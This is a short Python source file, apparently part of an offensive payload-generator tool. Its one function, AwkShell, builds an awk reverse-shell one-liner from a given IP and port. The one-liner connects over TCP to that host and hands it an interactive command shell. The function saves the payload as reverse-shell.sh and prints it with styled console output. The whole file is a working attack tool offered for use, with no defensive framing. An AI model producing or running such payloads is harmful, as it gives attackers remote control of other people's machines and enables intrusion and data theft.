from rich.console import Console
from rich.syntax import Syntax
from rich.style import Style
import time

console = Console()

def AwkShell(ip, port):
    payload = """awk 'BEGIN {s = "/inet/tcp/0/%s/%d"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null""" % (ip, port)
    with open("reverse-shell.sh", "w") as f, console.status("[#aed06d]Loading Reverse Shell...[/#aed06d]", spinner="circle"):
        time.sleep(3)
        f.write(payload)
    myStyle = Style(color="#7780ff", bold=True)
    console.print("\nThe payload is: \n", style=myStyle)
    synt = Syntax(payload,"bash",theme='dracula', line_numbers=True)
    console.print(synt)
    console.print("\n[#aed06d]Saved as reverse-shell.sh\n[/#aed06d]", style=myStyle)